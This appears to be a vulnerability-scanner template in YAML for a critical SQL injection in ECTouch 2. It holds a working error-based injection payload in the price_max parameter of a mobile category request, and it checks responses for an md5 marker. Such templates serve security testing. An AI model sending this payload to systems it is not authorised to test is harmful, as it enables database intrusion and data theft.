id: etouch-v2-sqli
brief:
    title: ECTouch 2 - SQL Injection
    by: princechaddha
    level: critical
    about: ECTouch 2 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the conte...
    label:
        - etouch
        - sqli
        - vuln
    score: CVSS:10.0
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5({{num}}),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)'''''
      signs:
        - "on": status
          status:
            - 200
        - "on": word
          has:
            - '{{md5({{num}})}}'
          in: body
          need: all
